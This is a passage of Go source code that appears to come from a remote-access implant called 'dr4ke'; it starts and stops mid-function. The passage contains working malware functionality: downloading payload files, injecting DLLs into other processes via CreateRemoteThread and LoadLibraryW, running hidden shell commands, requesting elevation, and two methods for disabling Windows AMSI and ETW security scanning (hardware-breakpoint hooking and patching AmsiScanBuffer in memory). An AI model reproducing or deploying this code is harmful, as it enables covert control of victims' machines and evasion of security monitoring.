	if err != nil {
		return fmt.Sprintf("Download failed: %v\nOutput: %s", err, string(output))
	}

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return fmt.Sprintf("File was not downloaded: %s", filePath)
	}

	fileInfo, err := os.Stat(filePath)
	if err != nil {
		return fmt.Sprintf("Error reading file info: %v", err)
	}

	return fmt.Sprintf("File downloaded successfully!\nPath: %s\nSize: %d bytes (%s)\nSource: %s",
		filePath,
		fileInfo.Size(),
		c.formatFileSize(fileInfo.Size()),
		url)
}

func (c *Client) formatFileSize(size int64) string {
	const unit = 1024
	if size < unit {
		return fmt.Sprintf("%d B", size)
	}
	div, exp := int64(unit), 0
	for n := size / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(size)/float64(div), "KMGTPE"[exp])
}

func (c *Client) listUploads() string {
	tempDir := filepath.Join(os.TempDir(), "dr4ke_uploads")

	if _, err := os.Stat(tempDir); os.IsNotExist(err) {
		return "No uploads directory found. Use 'upload [URL]' to download files first."
	}

	files, err := os.ReadDir(tempDir)
	if err != nil {
		return fmt.Sprintf("Error reading uploads directory: %v", err)
	}

	if len(files) == 0 {
		return "Uploads directory is empty. Use 'upload [URL]' to download files."
	}

	result := "Downloaded Files:\n"
	result += "-------------------------------------------------------------\n"

	for _, file := range files {
		if file.IsDir() {
			continue
		}

		filePath := filepath.Join(tempDir, file.Name())
		fileInfo, err := os.Stat(filePath)
		if err != nil {
			continue
		}

		result += fmt.Sprintf("%s (%s) - %s\n",
			file.Name(),
			c.formatFileSize(fileInfo.Size()),
			fileInfo.ModTime().Format("2006-01-02 15:04:05"))
	}

	result += "-------------------------------------------------------------\n"
	result += fmt.Sprintf("Directory: %s", tempDir)

	return result
}

func (c *Client) listProcesses() string {
	cmd := exec.Command("wmic", "process", "get", "name,processid,parentprocessid", "/format:csv")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed to list processes: %v", err)
	}
	return string(output)
}

func (c *Client) executeDllInject(targetProcess, dllPath string) string {
	if runtime.GOOS != "windows" {
		return "DLL injection is only supported on Windows"
	}

	if !filepath.IsAbs(dllPath) {
		tempDir := filepath.Join(os.TempDir(), "dr4ke_uploads")
		fullPath := filepath.Join(tempDir, dllPath)

		if _, err := os.Stat(fullPath); err == nil {
			dllPath = fullPath
		}
	}

	if _, err := os.Stat(dllPath); os.IsNotExist(err) {
		return fmt.Sprintf("DLL file not found: %s\nTip: Use 'upload https://example.com/payload.dll' first", dllPath)
	}

	pid, err := c.findProcessByName(targetProcess)
	if err != nil {
		return fmt.Sprintf("Process not found: %s", targetProcess)
	}

	err = c.injectDLL(pid, dllPath)
	if err != nil {
		return fmt.Sprintf("DLL injection failed: %v", err)
	}

	return fmt.Sprintf("DLL successfully injected!\nTarget: %s (PID: %d)\nDLL: %s", targetProcess, pid, dllPath)
}

func (c *Client) findProcessByName(processName string) (uint32, error) {
	cmd := exec.Command("wmic", "process", "where", fmt.Sprintf("name='%s'", processName), "get", "processid", "/value")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return 0, err
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "ProcessId=") {
			pidStr := strings.TrimPrefix(line, "ProcessId=")
			if pid, err := strconv.ParseUint(pidStr, 10, 32); err == nil && pid > 0 {
				return uint32(pid), nil
			}
		}
	}

	return 0, fmt.Errorf("process not found")
}

func (c *Client) injectDLL(pid uint32, dllPath string) error {
	dllPathUTF16, err := syscall.UTF16FromString(dllPath)
	if err != nil {
		return err
	}

	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32.Release()

	openProcess, err := kernel32.FindProc("OpenProcess")
	if err != nil {
		return fmt.Errorf("failed to find OpenProcess: %v", err)
	}

	virtualAllocEx, err := kernel32.FindProc("VirtualAllocEx")
	if err != nil {
		return fmt.Errorf("failed to find VirtualAllocEx: %v", err)
	}

	writeProcessMemory, err := kernel32.FindProc("WriteProcessMemory")
	if err != nil {
		return fmt.Errorf("failed to find WriteProcessMemory: %v", err)
	}

	createRemoteThread, err := kernel32.FindProc("CreateRemoteThread")
	if err != nil {
		return fmt.Errorf("failed to find CreateRemoteThread: %v", err)
	}

	getModuleHandle, err := kernel32.FindProc("GetModuleHandleW")
	if err != nil {
		return fmt.Errorf("failed to find GetModuleHandleW: %v", err)
	}

	getProcAddressLocal, err := kernel32.FindProc("GetProcAddress")
	if err != nil {
		return fmt.Errorf("failed to find GetProcAddress: %v", err)
	}

	closeHandle, err := kernel32.FindProc("CloseHandle")
	if err != nil {
		return fmt.Errorf("failed to find CloseHandle: %v", err)
	}

	hProcess, _, _ := openProcess.Call(
		PROCESS_ALL_ACCESS,
		0,
		uintptr(pid),
	)
	if hProcess == 0 {
		return fmt.Errorf("failed to open process (Access Denied or PID not found)")
	}
	defer closeHandle.Call(hProcess)

	dllPathSize := len(dllPathUTF16) * 2
	allocAddr, _, _ := virtualAllocEx.Call(
		hProcess,
		0,
		uintptr(dllPathSize),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if allocAddr == 0 {
		return fmt.Errorf("failed to allocate memory in target process")
	}

	var bytesWritten uintptr
	ret, _, _ := writeProcessMemory.Call(
		hProcess,
		allocAddr,
		uintptr(unsafe.Pointer(&dllPathUTF16[0])),
		uintptr(dllPathSize),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return fmt.Errorf("failed to write DLL path to target process")
	}
	kernel32DllStr, _ := syscall.UTF16PtrFromString("kernel32.dll")
	hKernel32, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(kernel32DllStr)))
	if hKernel32 == 0 {
		return fmt.Errorf("failed to get kernel32.dll handle")
	}

	loadLibraryStr, _ := syscall.BytePtrFromString("LoadLibraryW")
	loadLibraryAddr, _, _ := getProcAddressLocal.Call(hKernel32, uintptr(unsafe.Pointer(loadLibraryStr)))
	if loadLibraryAddr == 0 {
		return fmt.Errorf("failed to get LoadLibraryW address")
	}

	hThread, _, _ := createRemoteThread.Call(
		hProcess,
		0,
		0,
		loadLibraryAddr,
		allocAddr,
		0,
		0,
	)
	if hThread == 0 {
		return fmt.Errorf("failed to create remote thread")
	}
	defer closeHandle.Call(hThread)

	return nil
}

func (c *Client) executeWithTimeout(command string, timeout time.Duration) string {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		systemRoot := os.Getenv("SYSTEMROOT")
		if systemRoot == "" {
			systemRoot = "C:\\Windows" // fallback
		}
		cmdPath := filepath.Join(systemRoot, "System32", "cmd.exe")

		cmd = exec.CommandContext(ctx, cmdPath, "/C", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Env = os.Environ()
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()

	if ctx.Err() == context.DeadlineExceeded {
		return fmt.Sprintf("Command timed out after %v:\n%s\n\n📄 Partial output:\n%s", timeout, command, string(output))
	}

	if err != nil {
		return fmt.Sprintf("Error: %v\n📄 Output: %s", err, string(output))
	}

	return string(output)
}

func (c *Client) changeDirectory(dir string) string {
	if err := os.Chdir(dir); err != nil {
		return fmt.Sprintf("Failed to change directory: %v", err)
	}
	cwd, err := os.Getwd()
	if err != nil {
		return "Changed directory but failed to get new working directory"
	}
	return fmt.Sprintf("Changed to directory: %s", cwd)
}

func IsAdmin() bool {
	shell32, err := syscall.LoadDLL("shell32.dll")
	if err != nil {
		return false
	}
	defer shell32.Release()

	isUserAnAdmin, err := shell32.FindProc("IsUserAnAdmin")
	if err != nil {
		return false
	}

	ret, _, _ := isUserAnAdmin.Call()
	return ret != 0
}

func ElevateProcess() {
	verb := "runas"
	exe, _ := os.Executable()
	cwd, _ := os.Getwd()
	args := strings.Join(os.Args[1:], " ")

	verbPtr, _ := syscall.UTF16PtrFromString(verb)
	exePtr, _ := syscall.UTF16PtrFromString(exe)
	cwdPtr, _ := syscall.UTF16PtrFromString(cwd)
	argPtr, _ := syscall.UTF16PtrFromString(args)

	var showCmd int32 = 1

	err := windows.ShellExecute(0, verbPtr, exePtr, argPtr, cwdPtr, showCmd)
	if err != nil {
		fmt.Println(err)
	}
}

func (c *Client) executeGUICommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {

		systemRoot := os.Getenv("SYSTEMROOT")
		if systemRoot == "" {
			systemRoot = "C:\\Windows"
		}
		cmdPath := filepath.Join(systemRoot, "System32", "cmd.exe")

		cmdParts := strings.Fields(command)
		if len(cmdParts) > 0 {
			baseName := strings.ToLower(cmdParts[0])

			if baseName == "calc" || baseName == "notepad" || baseName == "mspaint" {
				if !strings.HasSuffix(baseName, ".exe") {
					cmdParts[0] = cmdParts[0] + ".exe"
					command = strings.Join(cmdParts, " ")
				}
			}
		}

		fmt.Printf("[DEBUG] Using cmd path: %s\n", cmdPath)
		fmt.Printf("[DEBUG] Executing GUI command: %s /C start /B %s\n", cmdPath, command)

		cmd = exec.Command(cmdPath, "/C", "start", "/B", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Env = os.Environ()
	} else {
		fmt.Printf("[DEBUG] Executing Unix GUI command: nohup sh -c %s &\n", command)
		cmd = exec.Command("nohup", "sh", "-c", command, "&")
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("[DEBUG] GUI command execution error: %v\n", err)
		if runtime.GOOS == "windows" {
			systemRoot := os.Getenv("SYSTEMROOT")
			if systemRoot == "" {
				systemRoot = "C:\\Windows"
			}
			cmdPath := filepath.Join(systemRoot, "System32", "cmd.exe")

			fmt.Printf("[DEBUG] Retrying with direct %s /C execution\n", cmdPath)
			cmd = exec.Command(cmdPath, "/C", command)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Env = os.Environ()
			output, err = cmd.CombinedOutput()
			if err != nil {
				return fmt.Sprintf("Error starting GUI application: %v\nOutput: %s", err, string(output))
			}
		} else {
			return fmt.Sprintf("Error starting GUI application: %v\nOutput: %s", err, string(output))
		}
	}

	fmt.Printf("[DEBUG] GUI command executed successfully\n")
	return fmt.Sprintf("GUI application started successfully: %s\nOutput: %s", command, string(output))
}

func (c *Client) executeNormalCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		systemRoot := os.Getenv("SYSTEMROOT")
		if systemRoot == "" {
			systemRoot = "C:\\Windows"
		}
		cmdPath := filepath.Join(systemRoot, "System32", "cmd.exe")

		fmt.Printf("[DEBUG] Using cmd path: %s\n", cmdPath)
		fmt.Printf("[DEBUG] Executing Windows command: %s /C %s\n", cmdPath, command)

		cmd = exec.Command(cmdPath, "/C", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

		cmd.Env = os.Environ()
	} else {
		fmt.Printf("[DEBUG] Executing Unix command: sh -c %s\n", command)
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("[DEBUG] Command execution error: %v\n", err)
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}

	fmt.Printf("[DEBUG] Command executed successfully, output length: %d\n", len(output))
	return string(output)
}

func (c *Client) isElevated() bool {
	return c.elevated
}

var (
	amsiAddress          uintptr
	etwAddress           uintptr
	hardwareBypassActive bool
	directPatchActive    bool
)

func HwbpEngineBreakpoint(position uint32, function uintptr) bool {

	ntdllDll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		fmt.Printf("[-] Failed to load ntdll.dll: %v\n", err)
		return false
	}

	kernel32Dll, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		fmt.Printf("[-] Failed to load kernel32.dll: %v\n", err)
		return false
	}

	ntGetContextThreadProc, err := ntdllDll.FindProc("NtGetContextThread")
	if err != nil {
		fmt.Printf("[-] Failed to find NtGetContextThread: %v\n", err)
		return false
	}

	ntSetContextThreadProc, err := ntdllDll.FindProc("NtSetContextThread")
	if err != nil {
		fmt.Printf("[-] Failed to find NtSetContextThread: %v\n", err)
		return false
	}

	getCurrentThreadProc, err := kernel32Dll.FindProc("GetCurrentThread")
	if err != nil {
		fmt.Printf("[-] Failed to find GetCurrentThread: %v\n", err)
		return false
	}

	context := CONTEXT{}
	context.ContextFlags = CONTEXT_DEBUG_REGISTERS

	currentThread, _, _ := getCurrentThreadProc.Call()
	ret, _, _ := ntGetContextThreadProc.Call(currentThread, uintptr(unsafe.Pointer(&context)))
	if ret != 0 {
		fmt.Println("[-] NtGetContextThread failed")
		return false
	}

	if function != 0 {
		switch position {
		case 0:
			context.Dr0 = function
		case 1:
			context.Dr1 = function
		case 2:
			context.Dr2 = function
		case 3:
			context.Dr3 = function
		}

		context.Dr7 &= ^(3 << (16 + 4*position))
		context.Dr7 &= ^(3 << (18 + 4*position))
		context.Dr7 |= 1 << (2 * position)
	} else {
		switch position {
		case 0:
			context.Dr0 = 0
		case 1:
			context.Dr1 = 0
		case 2:
			context.Dr2 = 0
		case 3:
			context.Dr3 = 0
		}
		context.Dr7 &= ^(1 << (2 * position))
	}

	ret, _, _ = ntSetContextThreadProc.Call(currentThread, uintptr(unsafe.Pointer(&context)))
	if ret != 0 {
		fmt.Println("[-] NtSetContextThread failed")
		return false
	}

	return true
}

func HwbpEngineHandler(exceptionInfo *EXCEPTION_POINTERS) uintptr {
	exceptionRecord := exceptionInfo.ExceptionRecord
	context := exceptionInfo.ContextRecord

	if exceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {

		if exceptionRecord.ExceptionAddress == amsiAddress {

			returnAddress := *(*uintptr)(unsafe.Pointer(context.Rsp))

			scanResultPtr := *(*uintptr)(unsafe.Pointer(context.Rsp + 6*unsafe.Sizeof(uintptr(0))))
			scanResult := (*uint32)(unsafe.Pointer(scanResultPtr))

			*scanResult = 0

			context.Rip = returnAddress
			context.Rsp += unsafe.Sizeof(uintptr(0))
			context.Rax = S_OK

			return EXCEPTION_CONTINUE_EXECUTION
		}

		if exceptionRecord.ExceptionAddress == etwAddress {

			context.Rip = *(*uintptr)(unsafe.Pointer(context.Rsp))
			context.Rsp += unsafe.Sizeof(uintptr(0))
			context.Rax = STATUS_SUCCESS

			return EXCEPTION_CONTINUE_EXECUTION
		}
	}

	return EXCEPTION_CONTINUE_SEARCH
}

func exceptionHandlerWrapper(exceptionInfo uintptr) uintptr {
	return HwbpEngineHandler((*EXCEPTION_POINTERS)(unsafe.Pointer(exceptionInfo)))
}

func stringToCharPtr(s string) uintptr {
	p, err := syscall.BytePtrFromString(s)
	if err != nil {
		return 0
	}
	return uintptr(unsafe.Pointer(p))
}

func loadAmsiLibrary() (uintptr, error) {
	fmt.Println("[+] Attempting to load amsi.dll...")

	kernel32dll, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return 0, fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32dll.Release()

	loadLibraryW, err := kernel32dll.FindProc("LoadLibraryW")
	if err != nil {
		return 0, fmt.Errorf("failed to find LoadLibraryW: %v", err)
	}

	approaches := []func() (uintptr, error){

		func() (uintptr, error) {
			dllNameUTF16, err := syscall.UTF16PtrFromString("amsi.dll")
			if err != nil {
				return 0, err
			}
			handle, _, loadErr := loadLibraryW.Call(uintptr(unsafe.Pointer(dllNameUTF16)))
			if handle == 0 {
				return 0, fmt.Errorf("LoadLibraryW failed: %v", loadErr)
			}
			return handle, nil
		},

		func() (uintptr, error) {
			dllNameUTF16, err := syscall.UTF16PtrFromString("C:\\Windows\\System32\\amsi.dll")
			if err != nil {
				return 0, err
			}
			handle, _, loadErr := loadLibraryW.Call(uintptr(unsafe.Pointer(dllNameUTF16)))
			if handle == 0 {
				return 0, fmt.Errorf("LoadLibraryW with full path failed: %v", loadErr)
			}
			return handle, nil
		},

		func() (uintptr, error) {
			dll, err := syscall.LoadDLL("amsi.dll")
			if err != nil {
				return 0, fmt.Errorf("syscall.LoadDLL failed: %v", err)
			}
			return uintptr(dll.Handle), nil
		},
	}

	var lastErr error
	for i, approach := range approaches {
		if handle, err := approach(); err == nil {
			fmt.Printf("[+] amsi.dll loaded successfully using approach %d\n", i+1)
			return handle, nil
		} else {
			lastErr = err
			fmt.Printf("[-] Approach %d failed: %v\n", i+1, err)
		}
	}

	return 0, fmt.Errorf("all approaches failed, last error: %v", lastErr)
}

func setupBypass() error {
	fmt.Println("[+] Setting up AMSI/ETW bypass...")

	obfAmsiScanBuffer := "AmsiScanBuffer"
	obfNtTraceEvent := "NtTraceEvent"

	amsiModule, err := loadAmsiLibrary()
	if err != nil {
		fmt.Printf("[-] Could not load amsi.dll: %v\n", err)
		fmt.Println("[!] Continuing without AMSI bypass...")
	}
	var ntdllModule uintptr

	if dll, err := syscall.LoadDLL("ntdll.dll"); err == nil {
		ntdllModule = uintptr(dll.Handle)
		fmt.Println("[+] ntdll.dll handle obtained via syscall.LoadDLL")
	} else {
		return fmt.Errorf("[-] Failed to get handle for ntdll.dll: %v", err)
	}

	kernel32Dll, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return fmt.Errorf("[-] Failed to load kernel32.dll: %v", err)
	}

	getProcAddressProc, err := kernel32Dll.FindProc("GetProcAddress")
	if err != nil {
		return fmt.Errorf("[-] Failed to find GetProcAddress: %v", err)
	}

	if amsiModule != 0 {
		amsiScanBufferPtr := stringToCharPtr(obfAmsiScanBuffer)
		if amsiScanBufferPtr == 0 {
			fmt.Println("[-] Failed to convert AmsiScanBuffer string to char pointer")
		} else {
			amsiAddress, _, _ = getProcAddressProc.Call(amsiModule, amsiScanBufferPtr)
			if amsiAddress == 0 {
				fmt.Println("[-] Failed to get address of AmsiScanBuffer")
			} else {
				fmt.Printf("[+] AmsiScanBuffer address: 0x%x\n", amsiAddress)
			}
		}
	}

	ntTraceEventPtr := stringToCharPtr(obfNtTraceEvent)
	if ntTraceEventPtr == 0 {
		return fmt.Errorf("[-] Failed to convert NtTraceEvent string to char pointer")
	}

	etwAddress, _, _ = getProcAddressProc.Call(ntdllModule, ntTraceEventPtr)
	if etwAddress == 0 {
		return fmt.Errorf("[-] Failed to get address of NtTraceEvent")
	}
	fmt.Printf("[+] NtTraceEvent address: 0x%x\n", etwAddress)
	addVectoredExceptionHandlerProc, err := kernel32Dll.FindProc("AddVectoredExceptionHandler")
	if err != nil {
		return fmt.Errorf("[-] Failed to find AddVectoredExceptionHandler: %v", err)
	}

	handlerPtr := syscall.NewCallback(exceptionHandlerWrapper)
	ret, _, _ := addVectoredExceptionHandlerProc.Call(1, handlerPtr)
	if ret == 0 {
		return fmt.Errorf("[-] Failed to register exception handler")
	}
	fmt.Println("[+] Exception handler registered")

	breakpointsSet := 0

	if amsiAddress != 0 {
		if HwbpEngineBreakpoint(0, amsiAddress) {
			fmt.Println("[+] AMSI breakpoint set successfully")
			breakpointsSet++
		} else {
			fmt.Println("[-] Failed to set AMSI breakpoint")
		}
	}

	if HwbpEngineBreakpoint(1, etwAddress) {
		fmt.Println("[+] ETW breakpoint set successfully")
		breakpointsSet++
	} else {
		fmt.Println("[-] Failed to set ETW breakpoint")
	}
	if breakpointsSet == 0 {
		return fmt.Errorf("[-] No breakpoints could be set")
	}

	fmt.Printf("[+] Bypass configured with %d breakpoint(s)\n", breakpointsSet)
	hardwareBypassActive = true
	return nil
}

const (
	AMSI_PATCH_OFFSET = 0x95
	PATCH_BYTE_JZ     = 0x74
	PATCH_BYTE_JNZ    = 0x75
)

func setupDirectAmsiPatch() error {
	fmt.Println("[+] Starting Direct AMSI Memory Patch (Main.cpp method)...")

	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32.Release()

	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return fmt.Errorf("failed to load ntdll.dll: %v", err)
	}
	defer ntdll.Release()

	loadLibraryW, err := kernel32.FindProc("LoadLibraryW")
	if err != nil {
		return fmt.Errorf("failed to find LoadLibraryW: %v", err)
	}
	getProcAddress, err := kernel32.FindProc("GetProcAddress")
	if err != nil {
		return fmt.Errorf("failed to find GetProcAddress: %v", err)
	}

	getCurrentProcess, err := kernel32.FindProc("GetCurrentProcess")
	if err != nil {
		return fmt.Errorf("failed to find GetCurrentProcess: %v", err)
	}

	virtualProtectEx, err := kernel32.FindProc("VirtualProtectEx")
	if err != nil {
		return fmt.Errorf("failed to find VirtualProtectEx: %v", err)
	}

	ntWriteVirtualMemory, err := ntdll.FindProc("NtWriteVirtualMemory")
	if err != nil {
		return fmt.Errorf("failed to find NtWriteVirtualMemory: %v", err)
	}

	amsiDllName, err := syscall.UTF16PtrFromString("amsi.dll")
	if err != nil {
		return fmt.Errorf("failed to convert amsi.dll name: %v", err)
	}

	amsiModule, _, _ := loadLibraryW.Call(uintptr(unsafe.Pointer(amsiDllName)))
	if amsiModule == 0 {
		return fmt.Errorf("failed to load amsi.dll")
	}
	fmt.Println("[+] amsi.dll loaded successfully")

	amsiScanBufferName, err := syscall.BytePtrFromString("AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("failed to convert AmsiScanBuffer name: %v", err)
	}

	amsiScanBufferAddr, _, _ := getProcAddress.Call(amsiModule, uintptr(unsafe.Pointer(amsiScanBufferName)))
	if amsiScanBufferAddr == 0 {
		return fmt.Errorf("failed to get AmsiScanBuffer address")
	}
	fmt.Printf("[+] AmsiScanBuffer address: 0x%x\n", amsiScanBufferAddr)

	patchAddr := amsiScanBufferAddr + AMSI_PATCH_OFFSET
	fmt.Printf("[+] Patch address: 0x%x (AmsiScanBuffer + 0x95)\n", patchAddr)

	hProcess, _, _ := getCurrentProcess.Call()
	if hProcess == 0 {
		return fmt.Errorf("failed to get current process handle")
	}

	currentByte := *(*byte)(unsafe.Pointer(patchAddr))
	fmt.Printf("[+] Current byte at patch address: 0x%02x\n", currentByte)

	if currentByte != PATCH_BYTE_JZ {
		fmt.Printf("[!] Warning: Expected byte 0x74 (JZ), found 0x%02x. Continuing anyway...\n", currentByte)
	}

	var oldProtect uint32
	regionSize := uintptr(0x1000)

	ret, _, _ := virtualProtectEx.Call(
		hProcess,
		patchAddr,
		regionSize,
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return fmt.Errorf("failed to change memory protection with VirtualProtectEx")
	}
	fmt.Printf("[+] Memory protection changed from 0x%x to 0x%x using VirtualProtectEx\n", oldProtect, PAGE_EXECUTE_READWRITE)

	patchByte := byte(PATCH_BYTE_JNZ)
	var bytesWritten uintptr

	status, _, _ := ntWriteVirtualMemory.Call(
		hProcess,
		patchAddr,
		uintptr(unsafe.Pointer(&patchByte)),
		uintptr(1),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if status != 0 {
		return fmt.Errorf("NtWriteVirtualMemory failed with status: 0x%x", status)
	}

	if bytesWritten != 1 {
		return fmt.Errorf("NtWriteVirtualMemory wrote %d bytes, expected 1", bytesWritten)
	}

	fmt.Printf("[+] Patch applied using NtWriteVirtualMemory: 0x%02x -> 0x%02x (JZ -> JNZ)\n", PATCH_BYTE_JZ, PATCH_BYTE_JNZ)

	patchedByte := *(*byte)(unsafe.Pointer(patchAddr))
	if patchedByte != PATCH_BYTE_JNZ {
		return fmt.Errorf("patch verification failed: expected 0x%02x, got 0x%02x", PATCH_BYTE_JNZ, patchedByte)
	}
	fmt.Printf("[+] Patch verification successful: 0x%02x\n", patchedByte)

	var newProtect uint32
	ret, _, _ = virtualProtectEx.Call(
		hProcess,
		patchAddr,
		regionSize,
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&newProtect)),
	)
	if ret == 0 {
		fmt.Println("[!] Warning: Failed to restore original memory protection")
	} else {
		fmt.Printf("[+] Memory protection restored to 0x%x\n", oldProtect)
	}
	fmt.Println("[+] Direct AMSI Memory Patch completed successfully!")
	directPatchActive = true
	return nil
}

func TsTAmsiBypass() {
	fmt.Println("[+] Testing AMSI bypass effectiveness...")

	methodsActive := 0

	if hardwareBypassActive {
		fmt.Println("[+] Method 1 - Hardware Breakpoint Bypass: ACTIVE")
		fmt.Printf("[+] AMSI breakpoint at: 0x%x\n", amsiAddress)
		fmt.Printf("[+] ETW breakpoint at: 0x%x\n", etwAddress)
		methodsActive++
	} else {
		fmt.Println("[-] Method 1 - Hardware Breakpoint Bypass: INACTIVE")
	}

	if directPatchActive {
		fmt.Println("[+] Method 2 - Direct Memory Patch Bypass: ACTIVE")

		kernel32, err := syscall.LoadDLL("kernel32.dll")
		if err == nil {
			defer kernel32.Release()

			loadLibraryW, err := kernel32.FindProc("LoadLibraryW")
			if err == nil {
				getProcAddress, err := kernel32.FindProc("GetProcAddress")
				if err == nil {
					amsiDllName, _ := syscall.UTF16PtrFromString("amsi.dll")
					amsiModule, _, _ := loadLibraryW.Call(uintptr(unsafe.Pointer(amsiDllName)))
					if amsiModule != 0 {
						amsiScanBufferName, _ := syscall.BytePtrFromString("AmsiScanBuffer")
						amsiScanBufferAddr, _, _ := getProcAddress.Call(amsiModule, uintptr(unsafe.Pointer(amsiScanBufferName)))
						if amsiScanBufferAddr != 0 {

							patchAddr := amsiScanBufferAddr + AMSI_PATCH_OFFSET
							currentByte := *(*byte)(unsafe.Pointer(patchAddr))

							if currentByte == PATCH_BYTE_JNZ {
								fmt.Printf("[+] Memory patch verified: 0x%02x (JNZ) at 0x%x\n", currentByte, patchAddr)
							} else {
								fmt.Printf("[!] Memory patch check: 0x%02x (unexpected) at 0x%x\n", currentByte, patchAddr)
							}
						}
					}
				}
			}
		}
		methodsActive++
	} else {
		fmt.Println("[-] Method 2 - Direct Memory Patch Bypass: INACTIVE")
	}

	if methodsActive == 0 {
		fmt.Println("[!] No bypass methods are active")
	} else if methodsActive == 1 {
		fmt.Println("[+] PARTIAL SUCCESS: 1 bypass method is active")
	} else {
		fmt.Println("[+] FULL SUCCESS: Both bypass methods are active!")
	}
}

func getModuleHandle(moduleName string) (uintptr, error) {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return 0, fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32.Release()

	proc, err := kernel32.FindProc("GetModuleHandleA")
	if err != nil {
		return 0, fmt.Errorf("failed to find GetModuleHandleA: %v", err)
	}

	namePtr, _ := syscall.BytePtrFromString(moduleName)
	ret, _, err := proc.Call(uintptr(unsafe.Pointer(namePtr)))
	if ret == 0 {
		return 0, err
	}
	return ret, nil
}

func getModuleInformation(process uintptr, module uintptr) (*MODULEINFO, error) {
	psapi, err := syscall.LoadDLL("psapi.dll")
	if err != nil {
		return nil, fmt.Errorf("failed to load psapi.dll: %v", err)
	}
	defer psapi.Release()

	proc, err := psapi.FindProc("GetModuleInformation")
	if err != nil {
		return nil, fmt.Errorf("failed to find GetModuleInformation: %v", err)
	}

	var mi MODULEINFO
	ret, _, err := proc.Call(
		process,
		module,
		uintptr(unsafe.Pointer(&mi)),
		uintptr(unsafe.Sizeof(mi)),
	)
	if ret == 0 {
		return nil, err
	}
	return &mi, nil
}

func getCurrentProcess() uintptr {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return 0
	}
	defer kernel32.Release()

	proc, err := kernel32.FindProc("GetCurrentProcess")
	if err != nil {
		return 0
	}

	ret, _, _ := proc.Call()
	return ret
}

func getSystemDirectory() (string, error) {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return "", fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32.Release()

	proc, err := kernel32.FindProc("GetSystemDirectoryA")
	if err != nil {
		return "", fmt.Errorf("failed to find GetSystemDirectoryA: %v", err)
	}

	buf := make([]byte, 260)
	ret, _, err := proc.Call(
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
	)
	if ret == 0 {
		return "", err
	}

	for i, b := range buf {
		if b == 0 {
			return string(buf[:i]), nil
		}
	}
	return string(buf), nil
}

func createFile(filename string) (uintptr, error) {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return 0, fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32.Release()

	proc, err := kernel32.FindProc("CreateFileA")
	if err != nil {
		return 0, fmt.Errorf("failed to find CreateFileA: %v", err)
	}

	namePtr, _ := syscall.BytePtrFromString(filename)
	ret, _, err := proc.Call(
		uintptr(unsafe.Pointer(namePtr)),
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		0,
		0,
	)
	if ret == uintptr(^uint(0)) {
		return 0, err
	}
	return ret, nil
}

func createFileMapping(hFile uintptr) (uintptr, error) {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return 0, fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32.Release()

	proc, err := kernel32.FindProc("CreateFileMappingA")
	if err != nil {
		return 0, fmt.Errorf("failed to find CreateFileMappingA: %v", err)
	}

	ret, _, err := proc.Call(
		hFile,
		0,
		PAGE_READONLY|SEC_IMAGE,
		0,
		0,
		0,
	)
	if ret == 0 {
		return 0, err
	}
	return ret, nil
}

func mapViewOfFile(hMapping uintptr) (uintptr, error) {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return 0, fmt.Errorf("failed to load kernel32.dll: %v", err)
	}
	defer kernel32.Release()

	proc, err := kernel32.FindProc("MapViewOfFile")
	if err != nil {
